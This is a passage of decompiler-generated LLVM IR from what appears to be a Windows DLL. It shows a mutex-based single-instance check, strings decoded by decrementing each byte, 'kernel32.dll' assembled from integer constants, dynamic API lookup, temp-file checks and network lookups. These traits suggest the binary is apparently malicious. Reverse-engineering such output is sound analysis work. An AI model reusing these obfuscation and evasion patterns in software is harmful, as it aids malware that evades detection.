  %79 = load i8, i8* %78, align 1, !insn.addr !4355
  %80 = add i32 %eax.1.reload, 1, !insn.addr !4356
  %81 = icmp eq i8 %79, 0, !insn.addr !4357
  %82 = icmp eq i1 %81, false, !insn.addr !4358
  store i32 %80, i32* %eax.1.reg2mem, !insn.addr !4358
  br i1 %82, label %dec_label_pc_10007b23, label %dec_label_pc_10007b2a, !insn.addr !4358

dec_label_pc_10007b2a:                            ; preds = %dec_label_pc_10007b23
  %83 = add nuw i32 %edx.0.reload, 1, !insn.addr !4359
  %84 = sub i32 %80, %72, !insn.addr !4360
  %85 = icmp ult i32 %83, %84, !insn.addr !4361
  store i32 %83, i32* %edx.0.reg2mem, !insn.addr !4362
  br i1 %85, label %dec_label_pc_10007b10, label %dec_label_pc_10007b30, !insn.addr !4362

dec_label_pc_10007b30:                            ; preds = %dec_label_pc_10007b2a, %dec_label_pc_10007b07
  %86 = load i32, i32* %42, align 4, !insn.addr !4363
  %87 = add i32 %86, 4, !insn.addr !4364
  %88 = inttoptr i32 %87 to i32*, !insn.addr !4364
  %89 = load i32, i32* %88, align 4, !insn.addr !4364
  %90 = add i32 %esp.0, -68, !insn.addr !4364
  %91 = inttoptr i32 %90 to i32*, !insn.addr !4364
  store i32 %89, i32* %91, align 4, !insn.addr !4364
  %92 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @1 to i32) }), !insn.addr !4365
  %93 = ptrtoint i8* %92 to i32, !insn.addr !4365
  %94 = add i32 %esp.0, -72, !insn.addr !4366
  %95 = inttoptr i32 %94 to i32*, !insn.addr !4366
  store i32 %93, i32* %95, align 4, !insn.addr !4366
  %96 = add i32 %esp.0, 3108, !insn.addr !4367
  %97 = add i32 %esp.0, -76, !insn.addr !4368
  %98 = inttoptr i32 %97 to i32*, !insn.addr !4368
  store i32 %96, i32* %98, align 4, !insn.addr !4368
  %99 = call i8* @StrStrA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4369
  %100 = icmp eq i8* %99, null, !insn.addr !4370
  %101 = icmp eq i1 %100, false, !insn.addr !4371
  store i32 %97, i32* %esp.1.reg2mem, !insn.addr !4371
  br i1 %101, label %dec_label_pc_10007bba, label %dec_label_pc_10007b50, !insn.addr !4371

dec_label_pc_10007b50:                            ; preds = %dec_label_pc_10007b30
  %102 = ptrtoint i8* %99 to i32, !insn.addr !4369
  %103 = add i32 %esp.0, -80, !insn.addr !4372
  %104 = inttoptr i32 %103 to i32*, !insn.addr !4372
  store i32 %102, i32* %104, align 4, !insn.addr !4372
  %105 = add i32 %esp.0, -84, !insn.addr !4373
  %106 = inttoptr i32 %105 to i32*, !insn.addr !4373
  store i32 128, i32* %106, align 4, !insn.addr !4373
  %107 = add i32 %esp.0, -88, !insn.addr !4374
  %108 = inttoptr i32 %107 to i32*, !insn.addr !4374
  store i32 4, i32* %108, align 4, !insn.addr !4374
  %109 = add i32 %esp.0, -92, !insn.addr !4375
  %110 = inttoptr i32 %109 to i32*, !insn.addr !4375
  store i32 %102, i32* %110, align 4, !insn.addr !4375
  %111 = add i32 %esp.0, -96, !insn.addr !4376
  %112 = inttoptr i32 %111 to i32*, !insn.addr !4376
  store i32 1, i32* %112, align 4, !insn.addr !4376
  %113 = add i32 %esp.0, -100, !insn.addr !4377
  %114 = inttoptr i32 %113 to i32*, !insn.addr !4377
  store i32 4, i32* %114, align 4, !insn.addr !4377
  store i32 %113, i32* %storemerge.reg2mem, !insn.addr !4378
  br label %dec_label_pc_10007b6f, !insn.addr !4378

dec_label_pc_10007b5f:                            ; preds = %dec_label_pc_10007a7c
  store i32 128, i32* %39, align 4, !insn.addr !4379
  %115 = add i32 %esp.0, -40, !insn.addr !4380
  %116 = inttoptr i32 %115 to i32*, !insn.addr !4380
  store i32 2, i32* %116, align 4, !insn.addr !4380
  %117 = add i32 %esp.0, -44, !insn.addr !4381
  %118 = inttoptr i32 %117 to i32*, !insn.addr !4381
  store i32 0, i32* %118, align 4, !insn.addr !4381
  %119 = add i32 %esp.0, -48, !insn.addr !4382
  %120 = inttoptr i32 %119 to i32*, !insn.addr !4382
  store i32 1, i32* %120, align 4, !insn.addr !4382
  %121 = add i32 %esp.0, -52, !insn.addr !4383
  %122 = inttoptr i32 %121 to i32*, !insn.addr !4383
  store i32 1073741824, i32* %122, align 4, !insn.addr !4383
  store i32 %121, i32* %storemerge.reg2mem, !insn.addr !4383
  br label %dec_label_pc_10007b6f, !insn.addr !4383

dec_label_pc_10007b6f:                            ; preds = %dec_label_pc_10007b5f, %dec_label_pc_10007b50
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %123 = add i32 %storemerge.reload, 1200, !insn.addr !4384
  %124 = add i32 %storemerge.reload, -4, !insn.addr !4385
  %125 = inttoptr i32 %124 to i32*, !insn.addr !4385
  store i32 %123, i32* %125, align 4, !insn.addr !4385
  %126 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !4386
  %127 = ptrtoint i32* %126 to i32, !insn.addr !4386
  %128 = add i32 %storemerge.reload, 12, !insn.addr !4387
  %129 = add i32 %storemerge.reload, -8, !insn.addr !4388
  %130 = inttoptr i32 %129 to i32*, !insn.addr !4388
  store i32 0, i32* %130, align 4, !insn.addr !4388
  %131 = add i32 %storemerge.reload, -12, !insn.addr !4389
  %132 = inttoptr i32 %131 to i32*, !insn.addr !4389
  store i32 %128, i32* %132, align 4, !insn.addr !4389
  %133 = add i32 %storemerge.reload, 172, !insn.addr !4390
  %134 = add i32 %storemerge.reload, -16, !insn.addr !4391
  %135 = inttoptr i32 %134 to i32*, !insn.addr !4391
  store i32 %133, i32* %135, align 4, !insn.addr !4391
  %136 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !4392
  %137 = add i32 %storemerge.reload, -20, !insn.addr !4393
  %138 = inttoptr i32 %137 to i32*, !insn.addr !4393
  store i32 %136, i32* %138, align 4, !insn.addr !4393
  %139 = add i32 %storemerge.reload, 168, !insn.addr !4394
  %140 = add i32 %storemerge.reload, -24, !insn.addr !4395
  %141 = inttoptr i32 %140 to i32*, !insn.addr !4395
  store i32 %139, i32* %141, align 4, !insn.addr !4395
  %142 = add i32 %storemerge.reload, -28, !insn.addr !4396
  %143 = inttoptr i32 %142 to i32*, !insn.addr !4396
  store i32 %127, i32* %143, align 4, !insn.addr !4396
  %144 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !4397
  %145 = add i32 %storemerge.reload, -32, !insn.addr !4398
  %146 = inttoptr i32 %145 to i32*, !insn.addr !4398
  store i32 0, i32* %146, align 4, !insn.addr !4398
  %147 = add i32 %storemerge.reload, -36, !insn.addr !4399
  %148 = inttoptr i32 %147 to i32*, !insn.addr !4399
  store i32 %131, i32* %148, align 4, !insn.addr !4399
  %149 = add i32 %storemerge.reload, -40, !insn.addr !4400
  %150 = inttoptr i32 %149 to i32*, !insn.addr !4400
  store i32 1, i32* %150, align 4, !insn.addr !4400
  %151 = add i32 %storemerge.reload, 36, !insn.addr !4401
  %152 = add i32 %storemerge.reload, -44, !insn.addr !4402
  %153 = inttoptr i32 %152 to i32*, !insn.addr !4402
  store i32 %151, i32* %153, align 4, !insn.addr !4402
  %154 = add i32 %storemerge.reload, -48, !insn.addr !4403
  %155 = inttoptr i32 %154 to i32*, !insn.addr !4403
  store i32 %127, i32* %155, align 4, !insn.addr !4403
  %156 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !4404
  %157 = add i32 %storemerge.reload, -52, !insn.addr !4405
  %158 = inttoptr i32 %157 to i32*, !insn.addr !4405
  store i32 %127, i32* %158, align 4, !insn.addr !4405
  %159 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !4406
  store i32 %157, i32* %esp.1.reg2mem, !insn.addr !4406
  br label %dec_label_pc_10007bba, !insn.addr !4406

dec_label_pc_10007bba:                            ; preds = %dec_label_pc_10007b6f, %dec_label_pc_10007b30
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %160 = add i32 %esp.1.reload, 20, !insn.addr !4407
  %161 = inttoptr i32 %160 to i32*, !insn.addr !4407
  %162 = load i32, i32* %161, align 4, !insn.addr !4407
  %163 = add i32 %esp.1.reload, -4, !insn.addr !4407
  %164 = inttoptr i32 %163 to i32*, !insn.addr !4407
  store i32 %162, i32* %164, align 4, !insn.addr !4407
  call void @freeaddrinfo(%addrinfo* bitcast (i32* @1 to %addrinfo*)), !insn.addr !4408
  %165 = call i32 @"@__security_check_cookie@4"(), !insn.addr !4409
  ret i32 %165, !insn.addr !4410
}

define i32 @function_10007be0() local_unnamed_addr {
dec_label_pc_10007be0:
  %ebx.1.reg2mem = alloca i32, !insn.addr !4411
  %ecx.11.reg2mem = alloca i32, !insn.addr !4411
  %ecx.10.reg2mem = alloca i32, !insn.addr !4411
  %esi.1.reg2mem = alloca i32, !insn.addr !4411
  %ebx.0.reg2mem = alloca i32, !insn.addr !4411
  %edi.8.reg2mem = alloca i32, !insn.addr !4411
  %edx.6.reg2mem = alloca i32, !insn.addr !4411
  %edi.7.reg2mem = alloca i32, !insn.addr !4411
  %edi.6.reg2mem = alloca i32, !insn.addr !4411
  %edx.5.reg2mem = alloca i32, !insn.addr !4411
  %storemerge.reg2mem = alloca i32, !insn.addr !4411
  %edi.5.reg2mem = alloca i32, !insn.addr !4411
  %esp.13.reg2mem = alloca i32, !insn.addr !4411
  %eax.14.reg2mem = alloca i32, !insn.addr !4411
  %stack_var_-67232.0.reg2mem = alloca i32, !insn.addr !4411
  %esp.12.reg2mem = alloca i32, !insn.addr !4411
  %edi.4.reg2mem = alloca i32, !insn.addr !4411
  %edx.4.reg2mem = alloca i32, !insn.addr !4411
  %ecx.9.reg2mem = alloca i32, !insn.addr !4411
  %edi.3.reg2mem = alloca i32, !insn.addr !4411
  %edx.3.reg2mem = alloca i32, !insn.addr !4411
  %edi.2.reg2mem = alloca i32, !insn.addr !4411
  %edx.2.reg2mem = alloca i32, !insn.addr !4411
  %ecx.8.reg2mem = alloca i32, !insn.addr !4411
  %.pre-phi139.reg2mem = alloca i32, !insn.addr !4411
  %.pre-phi141.reg2mem = alloca i32*, !insn.addr !4411
  %.pre-phi145.reg2mem = alloca i32*, !insn.addr !4411
  %.pre-phi149.reg2mem = alloca i32*, !insn.addr !4411
  %ecx.7.reg2mem = alloca i32, !insn.addr !4411
  %ecx.6.reg2mem = alloca i32, !insn.addr !4411
  %.pre-phi129.reg2mem = alloca i32*, !insn.addr !4411
  %.pre-phi133.reg2mem = alloca i32*, !insn.addr !4411
  %.pre-phi137.reg2mem = alloca i32*, !insn.addr !4411
  %ecx.5.reg2mem = alloca i32, !insn.addr !4411
  %edi.1.reg2mem = alloca i32, !insn.addr !4411
  %edi.0.reg2mem = alloca i32, !insn.addr !4411
  %edx.1.reg2mem = alloca i32, !insn.addr !4411
  %esp.7.reg2mem = alloca i32, !insn.addr !4411
  %.pre-phi121.reg2mem = alloca i32*, !insn.addr !4411
  %.pre-phi125.reg2mem = alloca i32*, !insn.addr !4411
  %esp.6.reg2mem = alloca i32, !insn.addr !4411
  %esp.5.reg2mem = alloca i32, !insn.addr !4411
  %eax.2.reg2mem = alloca i32, !insn.addr !4411
  %eax.1.reg2mem = alloca i32, !insn.addr !4411
  %edx.0.reg2mem = alloca i32, !insn.addr !4411
  %ecx.4.reg2mem = alloca i32, !insn.addr !4411
  %ecx.3.reg2mem = alloca i32, !insn.addr !4411
  %ecx.2.reg2mem = alloca i32, !insn.addr !4411
  %esp.4.reg2mem = alloca i32, !insn.addr !4411
  %esp.3.reg2mem = alloca i32, !insn.addr !4411
  %ecx.1.reg2mem = alloca i32, !insn.addr !4411
  %esp.2.reg2mem = alloca i32, !insn.addr !4411
  %esp.1.reg2mem = alloca i32, !insn.addr !4411
  %ecx.0.reg2mem = alloca i32, !insn.addr !4411
  %esp.0.reg2mem = alloca i32, !insn.addr !4411
  %0 = call i1 @__decompiler_undefined_function_5()
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-66133 = alloca i32, align 4
  %stack_var_-66132 = alloca i32, align 4
  %stack_var_-708 = alloca i32, align 4
  %stack_var_-707 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-908 = alloca i32, align 4
  %stack_var_-588 = alloca i32, align 4
  %stack_var_-2109 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-2108 = alloca i32, align 4
  %1 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-26132 = alloca i128, align 8
  %stack_var_-6132 = alloca i32, align 4
  %stack_var_-67240 = alloca i32, align 4
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-67256 = alloca i32, align 4
  %stack_var_-3132 = alloca i32, align 4
  %stack_var_-67216 = alloca %_OSVERSIONINFOW*, align 4
  %stack_var_-67252 = alloca i32, align 4
  %stack_var_-67248 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-80 = alloca i8*, align 4
  %stack_var_-46132 = alloca i32, align 4
  %stack_var_-67236 = alloca i32, align 4
  %stack_var_-67228 = alloca i8*, align 4
  %stack_var_-67220 = alloca i16*, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-272 = alloca i8*, align 4
  %stack_var_-372 = alloca i32, align 4
  %3 = call i128 @__decompiler_undefined_function_3()
  %4 = call i128 @__decompiler_undefined_function_3()
  %5 = call i128 @__decompiler_undefined_function_3()
  %6 = call i128 @__decompiler_undefined_function_3()
  %7 = call i128 @__decompiler_undefined_function_3()
  %8 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-488 = alloca i128, align 8
  %stack_var_-67224 = alloca i16*, align 4
  %stack_var_-156 = alloca i32, align 4
  %9 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-4 = alloca i32, align 4
  %10 = call i32 @__chkstk(), !insn.addr !4412
  %11 = call i128 @__asm_movq(i64 3343753924571329377), !insn.addr !4413
  store i32 842888742, i32* %stack_var_-156, align 4, !insn.addr !4414
  store i16* inttoptr (i32 100 to i16*), i16** %stack_var_-67224, align 4, !insn.addr !4415
  %12 = mul i64 %9, 4294967296
  %13 = sdiv i64 %12, 4294967296, !insn.addr !4416
  call void @__asm_movq.31(i64 %13, i128 %11), !insn.addr !4416
  %14 = call i32* @CreateMutexA(%_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i1 ptrtoint (i32* @1 to i1), i8* bitcast (i32* @1 to i8*)), !insn.addr !4417
  %15 = call i32 @GetLastError(), !insn.addr !4418
  %16 = icmp eq i32 %15, 183, !insn.addr !4419
  %17 = icmp eq i1 %16, false, !insn.addr !4420
  br i1 %17, label %dec_label_pc_10007c6a, label %dec_label_pc_10007c62, !insn.addr !4420

dec_label_pc_10007c62:                            ; preds = %dec_label_pc_10007be0
  call void @ExitProcess(i32 0), !insn.addr !4421
  unreachable, !insn.addr !4421

dec_label_pc_10007c6a:                            ; preds = %dec_label_pc_10007be0
  %18 = load i128, i128* @global_var_10039bc0, align 4, !insn.addr !4422
  %19 = call i128 @__asm_movaps(i128 %18), !insn.addr !4422
  %20 = load i128, i128* %stack_var_-488, align 8, !insn.addr !4423
  call void @__asm_movups(i128 %20, i128 %19), !insn.addr !4423
  %21 = load i128, i128* @global_var_100399d0, align 4, !insn.addr !4424
  %22 = call i128 @__asm_movaps(i128 %21), !insn.addr !4424
  call void @__asm_movups(i128 %8, i128 %22), !insn.addr !4425
  %23 = load i128, i128* @global_var_10039c40, align 4, !insn.addr !4426
  %24 = call i128 @__asm_movaps(i128 %23), !insn.addr !4426
  call void @__asm_movups(i128 %7, i128 %24), !insn.addr !4427
  %25 = load i128, i128* @global_var_10039a90, align 4, !insn.addr !4428
  %26 = call i128 @__asm_movaps(i128 %25), !insn.addr !4428
  call void @__asm_movups(i128 %6, i128 %26), !insn.addr !4429
  %27 = load i128, i128* @global_var_100399e0, align 4, !insn.addr !4430
  %28 = call i128 @__asm_movaps(i128 %27), !insn.addr !4430
  call void @__asm_movups(i128 %5, i128 %28), !insn.addr !4431
  %29 = load i128, i128* @global_var_10039a00, align 4, !insn.addr !4432
  %30 = call i128 @__asm_movaps(i128 %29), !insn.addr !4432
  call void @__asm_movups(i128 %4, i128 %30), !insn.addr !4433
  %31 = load i128, i128* @global_var_100399b0, align 4, !insn.addr !4434
  %32 = call i128 @__asm_movaps(i128 %31), !insn.addr !4434
  call void @__asm_movups(i128 %3, i128 %32), !insn.addr !4435
  %33 = call i32* @_memset(i32* inttoptr (i32 724491 to i32*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4436
  %34 = call i32* @_memset(i32* nonnull %stack_var_-372, i32 0, i32 100), !insn.addr !4437
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-272, align 4, !insn.addr !4438
  %35 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !4439
  store i32 1684107084, i32* %stack_var_-144, align 4, !insn.addr !4440
  %36 = call i32 @function_10009390(), !insn.addr !4441
  store i32 %36, i32* @global_var_1004094c, align 4, !insn.addr !4442
  %37 = call i32 @function_10009390(), !insn.addr !4443
  store i32 1936682051, i32* %stack_var_-372, align 4, !insn.addr !4444
  %38 = call i32 @function_10009390(), !insn.addr !4445
  store i32 1164863831, i32* %stack_var_-372, align 4, !insn.addr !4446
  %39 = call i32 @function_10009390(), !insn.addr !4447
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4448
  store i8* inttoptr (i32 1000 to i8*), i8** %stack_var_-67228, align 4, !insn.addr !4449
  store i32 0, i32* %stack_var_-67236, align 4, !insn.addr !4450
  %40 = call i32 @function_10007550(i32 0, i32 1000, i32 0), !insn.addr !4451
  %41 = bitcast i32* %stack_var_-46132 to i8*
  %42 = call i32 @GetTempPathA(i32 1000, i8* nonnull %41), !insn.addr !4452
  %43 = call i8* @lstrcatA(i8* nonnull %41, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100393ec, i32 0, i32 0)), !insn.addr !4453
  store i8* %41, i8** %stack_var_-80, align 4, !insn.addr !4454
  %44 = ptrtoint i8** %stack_var_-80 to i32, !insn.addr !4454
  %45 = call i32* @CreateFileA(i8* nonnull %41, i32 -2147483648, i32 7, %_SECURITY_ATTRIBUTES* null, i32 3, i32 0, i32* null), !insn.addr !4455
  %46 = icmp eq i32* %45, inttoptr (i32 -1 to i32*), !insn.addr !4456
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !4457
  br i1 %46, label %dec_label_pc_10007e6f, label %dec_label_pc_10007e68, !insn.addr !4457

dec_label_pc_10007e68:                            ; preds = %dec_label_pc_10007c6a
  %47 = ptrtoint i32* %45 to i32, !insn.addr !4455
  store i32 %47, i32* %stack_var_-84, align 4, !insn.addr !4458
  %48 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !4458
  %49 = call i1 @CloseHandle(i32* %45), !insn.addr !4459
  store i32 %48, i32* %esp.0.reg2mem, !insn.addr !4459
  br label %dec_label_pc_10007e6f, !insn.addr !4459

dec_label_pc_10007e6f:                            ; preds = %dec_label_pc_10007e68, %dec_label_pc_10007c6a
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = add i32 %esp.0.reload, -4, !insn.addr !4460
  %51 = inttoptr i32 %50 to i32*, !insn.addr !4460
  store i32 1000, i32* %51, align 4, !insn.addr !4460
  call void @Sleep(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4461
  %52 = add i32 %esp.0.reload, -8, !insn.addr !4462
  %53 = inttoptr i32 %52 to i32*, !insn.addr !4462
  store i32 ptrtoint ([13 x i8]* @global_var_1003d9e0 to i32), i32* %53, align 4, !insn.addr !4462
  store i32 1852990827, i32* bitcast ([13 x i8]* @global_var_1003d9e0 to i32*), align 4, !insn.addr !4463
  store i32 842230885, i32* bitcast ([9 x i8]* @global_var_1003d9e4 to i32*), align 4, !insn.addr !4464
  store i32 1819042862, i32* bitcast ([5 x i8]* @global_var_1003d9e8 to i32*), align 4, !insn.addr !4465
  store i8 0, i8* bitcast (i32* @global_var_1003d9ec to i8*), align 4, !insn.addr !4466
  %54 = call i32* @GetModuleHandleA(i8* bitcast (i32* @1 to i8*)), !insn.addr !4467
  %55 = add i32 %esp.0.reload, -12, !insn.addr !4468
  %56 = inttoptr i32 %55 to i32*, !insn.addr !4468
  store i32 ptrtoint ([23 x i8]* @global_var_1003d9c8 to i32), i32* %56, align 4, !insn.addr !4468
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4469
  %57 = call i32 @lstrlenA(i8* null), !insn.addr !4470
  %58 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4471
  %59 = ptrtoint i16* %58 to i32, !insn.addr !4471
  %60 = icmp sgt i32 %57, %59, !insn.addr !4472
  store i32 %59, i32* %ecx.0.reg2mem, !insn.addr !4472
  store i32 %55, i32* %esp.1.reg2mem, !insn.addr !4472
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !4472
  br i1 %60, label %dec_label_pc_10007ed0, label %dec_label_pc_10007ef2, !insn.addr !4472

dec_label_pc_10007ed0:                            ; preds = %dec_label_pc_10007e6f, %dec_label_pc_10007ed0
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %61 = add i32 %ecx.0.reload, ptrtoint ([23 x i8]* @global_var_1003d9c8 to i32), !insn.addr !4473
  %62 = inttoptr i32 %61 to i8*, !insn.addr !4473
  %63 = load i8, i8* %62, align 1, !insn.addr !4473
  %64 = add i8 %63, -1, !insn.addr !4473
  store i8 %64, i8* %62, align 1, !insn.addr !4473
  %65 = add i32 %ecx.0.reload, 1, !insn.addr !4474
  %66 = add i32 %esp.1.reload, -4, !insn.addr !4475
  %67 = inttoptr i32 %66 to i32*, !insn.addr !4475
  store i32 ptrtoint ([23 x i8]* @global_var_1003d9c8 to i32), i32* %67, align 4, !insn.addr !4475
  %68 = inttoptr i32 %65 to i16*, !insn.addr !4476
  store i16* %68, i16** %stack_var_-67220, align 4, !insn.addr !4476
  %69 = inttoptr i32 %65 to i8*
  %70 = call i32 @lstrlenA(i8* %69), !insn.addr !4477
  %71 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4478
  %72 = ptrtoint i16* %71 to i32, !insn.addr !4478
  %73 = icmp sgt i32 %70, %72, !insn.addr !4479
  store i32 %72, i32* %ecx.0.reg2mem, !insn.addr !4479
  store i32 %66, i32* %esp.1.reg2mem, !insn.addr !4479
  store i32 %66, i32* %esp.2.reg2mem, !insn.addr !4479
  br i1 %73, label %dec_label_pc_10007ed0, label %dec_label_pc_10007ef2, !insn.addr !4479

dec_label_pc_10007ef2:                            ; preds = %dec_label_pc_10007ed0, %dec_label_pc_10007e6f
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %74 = add i32 %esp.2.reload, -4, !insn.addr !4480
  %75 = inttoptr i32 %74 to i32*, !insn.addr !4480
  store i32 ptrtoint ([13 x i8]* @global_var_1003d9b8 to i32), i32* %75, align 4, !insn.addr !4480
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4481
  %76 = call i32 @lstrlenA(i8* null), !insn.addr !4482
  %77 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4483
  %78 = ptrtoint i16* %77 to i32, !insn.addr !4483
  %79 = icmp sgt i32 %76, %78, !insn.addr !4484
  store i32 %78, i32* %ecx.1.reg2mem, !insn.addr !4484
  store i32 %74, i32* %esp.3.reg2mem, !insn.addr !4484
  store i32 %74, i32* %esp.4.reg2mem, !insn.addr !4484
  br i1 %79, label %dec_label_pc_10007f11, label %dec_label_pc_10007f33, !insn.addr !4484

dec_label_pc_10007f11:                            ; preds = %dec_label_pc_10007ef2, %dec_label_pc_10007f11
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %80 = add i32 %ecx.1.reload, ptrtoint ([13 x i8]* @global_var_1003d9b8 to i32), !insn.addr !4485
  %81 = inttoptr i32 %80 to i8*, !insn.addr !4485
  %82 = load i8, i8* %81, align 1, !insn.addr !4485
  %83 = add i8 %82, -1, !insn.addr !4485
  store i8 %83, i8* %81, align 1, !insn.addr !4485
  %84 = add i32 %ecx.1.reload, 1, !insn.addr !4486
  %85 = add i32 %esp.3.reload, -4, !insn.addr !4487
  %86 = inttoptr i32 %85 to i32*, !insn.addr !4487
  store i32 ptrtoint ([13 x i8]* @global_var_1003d9b8 to i32), i32* %86, align 4, !insn.addr !4487
  %87 = inttoptr i32 %84 to i16*, !insn.addr !4488
  store i16* %87, i16** %stack_var_-67220, align 4, !insn.addr !4488
  %88 = inttoptr i32 %84 to i8*
  %89 = call i32 @lstrlenA(i8* %88), !insn.addr !4489
  %90 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4490
  %91 = ptrtoint i16* %90 to i32, !insn.addr !4490
  %92 = icmp sgt i32 %89, %91, !insn.addr !4491
  store i32 %91, i32* %ecx.1.reg2mem, !insn.addr !4491
  store i32 %85, i32* %esp.3.reg2mem, !insn.addr !4491
  store i32 %85, i32* %esp.4.reg2mem, !insn.addr !4491
  br i1 %92, label %dec_label_pc_10007f11, label %dec_label_pc_10007f33, !insn.addr !4491

dec_label_pc_10007f33:                            ; preds = %dec_label_pc_10007f11, %dec_label_pc_10007ef2
  %93 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !4492
  %esp.4.reload = load i32, i32* %esp.4.reg2mem
  store i32 1684107084, i32* %stack_var_-144, align 4, !insn.addr !4493
  %94 = call i32 @function_10009390(), !insn.addr !4494
  store i32 %94, i32* @global_var_1004094c, align 4, !insn.addr !4495
  %95 = add i32 %esp.4.reload, -4, !insn.addr !4496
  %96 = inttoptr i32 %95 to i32*, !insn.addr !4496
  %97 = ptrtoint i32* %stack_var_-67248 to i32, !insn.addr !4496
  store i32 %97, i32* %96, align 4, !insn.addr !4496
  %98 = add i32 %esp.4.reload, -8, !insn.addr !4497
  %99 = inttoptr i32 %98 to i32*, !insn.addr !4497
  store i32 0, i32* %99, align 4, !insn.addr !4497
  %100 = add i32 %esp.4.reload, -12, !insn.addr !4498
  %101 = inttoptr i32 %100 to i32*, !insn.addr !4498
  store i32 0, i32* %101, align 4, !insn.addr !4498
  %102 = add i32 %esp.4.reload, -16, !insn.addr !4499
  %103 = inttoptr i32 %102 to i32*, !insn.addr !4499
  store i32 268447664, i32* %103, align 4, !insn.addr !4499
  %104 = add i32 %esp.4.reload, -20, !insn.addr !4500
  %105 = inttoptr i32 %104 to i32*, !insn.addr !4500
  store i32 0, i32* %105, align 4, !insn.addr !4500
  %106 = add i32 %esp.4.reload, -24, !insn.addr !4501
  %107 = inttoptr i32 %106 to i32*, !insn.addr !4501
  store i32 0, i32* %107, align 4, !insn.addr !4501
  store i32 1953655126, i32* %stack_var_-144, align 4, !insn.addr !4502
  %108 = call i32 @function_10009390(), !insn.addr !4503
  %109 = add i32 %93, -484, !insn.addr !4504
  store i32 0, i32* %ecx.2.reg2mem, !insn.addr !4505
  br label %dec_label_pc_10007fb4, !insn.addr !4505

dec_label_pc_10007fb4:                            ; preds = %dec_label_pc_10007fb4, %dec_label_pc_10007f33
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %110 = add i32 %109, %ecx.2.reload, !insn.addr !4504
  %111 = inttoptr i32 %110 to i8*, !insn.addr !4504
  %112 = load i8, i8* %111, align 1, !insn.addr !4504
  %113 = add i8 %112, -1, !insn.addr !4504
  store i8 %113, i8* %111, align 1, !insn.addr !4504
  %114 = add nuw nsw i32 %ecx.2.reload, 1, !insn.addr !4506
  %exitcond119 = icmp eq i32 %114, 115
  store i32 %114, i32* %ecx.2.reg2mem, !insn.addr !4507
  br i1 %exitcond119, label %dec_label_pc_10007fc1, label %dec_label_pc_10007fb4, !insn.addr !4507

dec_label_pc_10007fc1:                            ; preds = %dec_label_pc_10007fb4
  %115 = add i32 %esp.4.reload, -28, !insn.addr !4508
  %116 = inttoptr i32 %115 to i32*, !insn.addr !4508
  store i32 115, i32* %116, align 4, !insn.addr !4508
  store i16* inttoptr (i32 115 to i16*), i16** %stack_var_-67220, align 4, !insn.addr !4509
  %117 = add i32 %esp.4.reload, -32, !insn.addr !4510
  %118 = inttoptr i32 %117 to i32*, !insn.addr !4510
  %119 = ptrtoint i32* %stack_var_-67252 to i32, !insn.addr !4510
  store i32 %119, i32* %118, align 4, !insn.addr !4510
  %120 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4511
  %121 = ptrtoint i16* %120 to i32, !insn.addr !4511
  %122 = call i32 @function_10008950(i32 %121), !insn.addr !4511
  %123 = add i32 %esp.4.reload, -36, !insn.addr !4512
  %124 = inttoptr i32 %123 to i32*, !insn.addr !4512
  store i32 284, i32* %124, align 4, !insn.addr !4512
  %125 = add i32 %esp.4.reload, -40, !insn.addr !4513
  %126 = inttoptr i32 %125 to i32*, !insn.addr !4513
  store i32 0, i32* %126, align 4, !insn.addr !4513
  %127 = add i32 %esp.4.reload, -44, !insn.addr !4514
